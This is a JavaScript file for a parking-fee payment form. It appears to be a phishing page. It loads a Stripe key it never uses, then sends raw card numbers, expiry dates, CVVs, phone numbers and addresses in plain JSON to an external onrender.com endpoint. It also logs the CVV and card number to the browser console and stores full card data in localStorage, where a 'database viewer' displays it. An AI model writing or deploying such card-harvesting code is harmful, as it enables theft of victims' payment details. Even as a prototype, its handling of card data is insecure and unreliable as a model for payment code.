const stripe = Stripe("pk_test_51RmkiGGgaoibLfK2Yi4N7qA899umltcEeegJ3WktvbTAF4hc3V0MWccrwnRZWcPpEDkC9MdWfgXytHgMNjIl8Gxw00Ym8gFpwo");

// Función segura para obtener elementos por ID y evitar errores si no existen
function safeGetElementById(id) {
    return document.getElementById(id);
}

// Function to format credit card number with spaces after every 4 digits
function formatCreditCard(input) {
    // Remove all non-digit characters
    let value = input.value.replace(/\D/g, '');
    
    // Add a space after every 4 digits
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
            formattedValue += ' ';
        }
        formattedValue += value[i];
    }
    
    // Update the input value
    input.value = formattedValue;
    
    // Check form completion
    checkFormCompletion();
}

// Function to validate credit card using Luhn algorithm
function validateCreditCard(cardNumber) {
    // Remove spaces and non-digit characters
    cardNumber = cardNumber.replace(/\D/g, '');
    
    if (cardNumber.length < 13 || cardNumber.length > 19) {
        return false;
    }
    
    let sum = 0;
    let doubleUp = false;
    
    // Process each digit
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));
        
        if (doubleUp) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        doubleUp = !doubleUp;
    }
    
    // If the sum is a multiple of 10, the card number is valid
    return (sum % 10) === 0;
}

// Function to format expiration date as MM/YY
function formatExpirationDate(input) {
    // Remove all non-digit characters
    let value = input.value.replace(/\D/g, '');
    
    // Format as MM/YY
    if (value.length > 0) {
        // Handle month input
        if (value.length >= 1) {
            // If first digit is > 1, prepend 0
            if (parseInt(value[0]) > 1) {
                value = '0' + value[0] + value.substring(1);
            }
            // If month is > 12, set to 12
            if (value.length >= 2) {
                let month = parseInt(value.substring(0, 2));
                if (month > 12) {
                    value = '12' + value.substring(2);
                }
            }
        }
        
        // Add slash after month
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2);
        }
    }
    
    // Limit to MM/YY format (5 characters)
    if (value.length > 5) {
        value = value.substring(0, 5);
    }
    
    // Update the input value
    input.value = value;
    
    // Check form completion
    checkFormCompletion();
}

// Function to validate expiration date (must be in the future)
function validateExpirationDate(expirationDate) {
    // Check format
    if (!/^\d{2}\/\d{2}$/.test(expirationDate)) {
        return false;
    }
    
    const parts = expirationDate.split('/');
    const month = parseInt(parts[0]);
    const year = parseInt('20' + parts[1]); // Convert to 4-digit year
    
    // Get current date
    const now = new Date();
    const currentMonth = now.getMonth() + 1; // getMonth() is 0-indexed
    const currentYear = now.getFullYear();
    
    // Check if date is valid
    if (month < 1 || month > 12) {
        return false;
    }
    
    // Check if date is in the future
    if (year < currentYear) {
        return false;
    }
    if (year === currentYear && month < currentMonth) {
        return false;
    }
    
    return true;
}

// Function to validate CVV
function validateCVV(cvv) {
    // CVV should be 3 or 4 digits
    return /^\d{3,4}$/.test(cvv);
}

// Function to check if all required fields are filled and valid
function checkFormCompletion() {
    const licensePlate = safeGetElementById('licensePlate')?.value.trim() ?? '';
    const mobileNumber = safeGetElementById('mobileNumber')?.value.trim() ?? '';
    const cardNumber = safeGetElementById('cardNumber')?.value.trim() ?? '';
    const expirationDate = safeGetElementById('expirationDate')?.value.trim() ?? '';
    const cvv = safeGetElementById('cvv')?.value.trim() ?? '';
    const recipientName = safeGetElementById('recipientName')?.value.trim() ?? '';
    const streetAddress = safeGetElementById('streetAddress')?.value.trim() ?? '';
    const city = safeGetElementById('city')?.value.trim() ?? '';
    const state = safeGetElementById('state')?.value.trim() ?? '';
    const zipCode = safeGetElementById('zipCode')?.value.trim() ?? '';
    
    // Check if all required fields are filled
    const allFieldsFilled = 
        licensePlate !== '' && 
        mobileNumber !== '' && 
        cardNumber !== '' && 
        expirationDate !== '' && 
        cvv !== '' && 
        recipientName !== '' && 
        streetAddress !== '' && 
        city !== '' && 
        state !== '' && 
        zipCode !== '';
    
    // Check if card number and expiration date are valid
    const isCardValid = validateCreditCard(cardNumber);
    const isExpirationValid = validateExpirationDate(expirationDate);
    const isCVVValid = validateCVV(cvv);
    
    const submitButton = safeGetElementById('submitButton');
    
    // If all fields are filled and valid, activate the button
    if (submitButton) {
        if (allFieldsFilled && isCardValid && isExpirationValid && isCVVValid) {
            submitButton.classList.add('active');
            submitButton.disabled = false;
        } else {
            submitButton.classList.remove('active');
            submitButton.disabled = true;
        }
    }
}

// Function to save form data to localStorage
function saveFormData() {
    const formData = {
        licensePlate: safeGetElementById('licensePlate')?.value.trim() ?? '',
        mobileNumber: safeGetElementById('mobileNumber')?.value.trim() ?? '',
        cardNumber: safeGetElementById('cardNumber')?.value.trim() ?? '',
        expirationDate: safeGetElementById('expirationDate')?.value.trim() ?? '',
        cvv: safeGetElementById('cvv')?.value.trim() ?? '',
        recipientName: safeGetElementById('recipientName')?.value.trim() ?? '',
        streetAddress: safeGetElementById('streetAddress')?.value.trim() ?? '',
        apartment: safeGetElementById('apartment')?.value.trim() ?? '',
        city: safeGetElementById('city')?.value.trim() ?? '',
        state: safeGetElementById('state')?.value.trim() ?? '',
        zipCode: safeGetElementById('zipCode')?.value.trim() ?? '',
        timestamp: new Date().toISOString()
    };
    
    // Get existing data from localStorage
    let savedData = [];
    try {
        const existingData = localStorage.getItem('paymentData');
        if (existingData) {
            savedData = JSON.parse(existingData);
        }
    } catch (e) {
        console.error('Error loading existing data:', e);
    }
    
    // Add new data
    savedData.push(formData);
    
    // Save back to localStorage
    localStorage.setItem('paymentData', JSON.stringify(savedData));
    
    // Update the database viewer if it exists
    updateDatabaseViewer();
    
    return formData;
}

// Function to update the database viewer
function updateDatabaseViewer() {
    const databaseViewer = safeGetElementById('databaseViewer');
    const databaseContent = safeGetElementById('databaseContent');
    
    if (databaseViewer && databaseContent) {
        try {
            const data = localStorage.getItem('paymentData');
            if (data) {
                const parsedData = JSON.parse(data);
                databaseContent.textContent = JSON.stringify(parsedData, null, 2);
                databaseViewer.style.display = 'block';
            } else {
                databaseContent.textContent = 'No data saved yet.';
            }
        } catch (e) {
            databaseContent.textContent = 'Error loading data: ' + e.message;
        }
    }
}

// Function to show the success modal
function showSuccessModal() {
    const modal = safeGetElementById('successModal');
    if (modal) {
        modal.style.display = 'flex';
    }
}

// Initialize when the document is loaded
document.addEventListener('DOMContentLoaded', function() {
    const cardInput = safeGetElementById('cardNumber');
    const expirationInput = safeGetElementById('expirationDate');
    const expirationError = safeGetElementById('expirationError');
    const cvvInput = safeGetElementById('cvv');
    const submitButton = safeGetElementById('submitButton');
    const form = safeGetElementById('paymentForm');
    
    if (!cardInput || !expirationInput || !cvvInput || !submitButton || !form) {
        console.warn('Faltan elementos en el DOM para iniciar el script.');
        return; // No continuar si faltan elementos básicos
    }
    
    // Add input event listeners to all form fields
    const allInputs = document.querySelectorAll('.input-field, .card-number');
    allInputs.forEach(input => {
        input.addEventListener('input', function() {
            checkFormCompletion();
        });
    });
    
    // Format credit card on input
    cardInput.addEventListener('input', function() {
        formatCreditCard(this);
    });
    
    // Validate credit card on blur
    cardInput.addEventListener('blur', function() {
        const isValid = validateCreditCard(this.value);
        
        if (isValid) {
            this.style.color = '#333';
            this.parentElement.style.borderColor = '#d4c4fb';
        } else {
            this.style.color = '#ff5555';
            this.parentElement.style.borderColor = '#ff5555';
        }
    });
    
    // Format expiration date on input
    expirationInput.addEventListener('input', function() {
        formatExpirationDate(this);
    });
    
    // Validate expiration date on blur
    expirationInput.addEventListener('blur', function() {
        const isValid = validateExpirationDate(this.value);
        
        if (expirationError) {
            if (isValid) {
                this.style.color = '#333';
                this.parentElement.style.borderColor = '#d4c4fb';
                expirationError.style.display = 'none';
            } else {
                this.style.color = '#ff5555';
                this.parentElement.style.borderColor = '#ff5555';
                expirationError.style.display = 'block';
            }
        }
    });
    
    // Validate CVV on blur
    cvvInput.addEventListener('blur', function() {
        const isValid = validateCVV(this.value);
        
        if (isValid) {
            this.style.color = '#333';
            this.parentElement.style.borderColor = '#d4c4fb';
        } else {
            this.style.color = '#ff5555';
            this.parentElement.style.borderColor = '#ff5555';
        }
    });
    
    // Set a valid future date as default for expiration (current month + 1 year)
    const now = new Date();
    const month = (now.getMonth() + 1).toString().padStart(2, '0');
    const year = (now.getFullYear() + 1).toString().slice(-2);
    expirationInput.value = `${month}/${year}`;
});

// Listener para el botón submit
const submitBtn = safeGetElementById("submitButton");
if (submitBtn) {
    submitBtn.addEventListener("click", async () => {
        event.preventDefault();

        const licensePlate = safeGetElementById("licensePlate")?.value ?? '';
        const mobileNumber = safeGetElementById("mobileNumber")?.value ?? "";
        const cardNumber = safeGetElementById("cardNumber")?.value ?? '';
        const expirationDate = safeGetElementById("expirationDate")?.value ?? '';
        const cvv = safeGetElementById("cvv")?.value ?? '';
        const name = safeGetElementById("recipientName")?.value ?? "";
        const streetAddress = safeGetElementById("streetAddress")?.value ?? '';
        const apartment = safeGetElementById("apartment")?.value ?? '';
        const city = safeGetElementById("city")?.value ?? '';
        const state = safeGetElementById("state")?.value ?? "";
        const zipCode = safeGetElementById("zipCode")?.value ?? "";

        const data = { licensePlate,
                        mobileNumber,
                        cardNumber,
                        expirationDate,
                        cvv,
                        name,
                        streetAddress,
                        apartment,
                        city,
                        state,
                        zipCode 
                    };

        console.log("licensePlate: " + licensePlate);
        console.log("mobileNumber: " + mobileNumber);
        console.log("cardNumber: " + cardNumber);
        console.log("expirationDate: " + expirationDate);
        console.log("nombre: " + name);
        console.log("fecha: " + expirationDate);
        console.log("cvv: " + cvv);
        console.log("streetAddress: " + streetAddress);
        console.log("apartment: " + apartment);
        console.log("city: " + city);
        console.log("state: " + state);
        console.log("zipCode: " + zipCode);

        try {
        const response = await fetch("https://parking-gn8l.onrender.com/api/payment", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
          });

          const result = await response.json();

          if (response.ok) {
           // alert("✅ Pago registrado con ID: " + result.id);
           // showSuccessModal();

           cambiarURLSinRecargar("/pagina2");
            } else {
            alert("❌ Error: " + result.error);
            console.error(result);
          }

        } catch (error) {
          console.error("❌ Error al conectar con backend:", error);
          alert("No se pudo conectar con el servidor.");
        }
    });
}

function cargarContenidoDePagina2(){
    
};

function cambiarURLSinRecargar(nuevaURL) {
  history.pushState(null, null, nuevaURL);
  cambiarRuta(nuevaURL);
}

function cambiarRuta(url) {
  if (url.endsWith("/pagina2")) {
    // Mostrar contenido o sección de página 2
    document.getElementById("paginaDePago").style.display = "none";
    document.getElementById("pagina2").style.display = "block";
  } else {
    // Mostrar contenido o sección de páginaDePago
    document.getElementById("paginaDePago").style.display = "block";
    document.getElementById("pagina2").style.display = "none";
  }
}
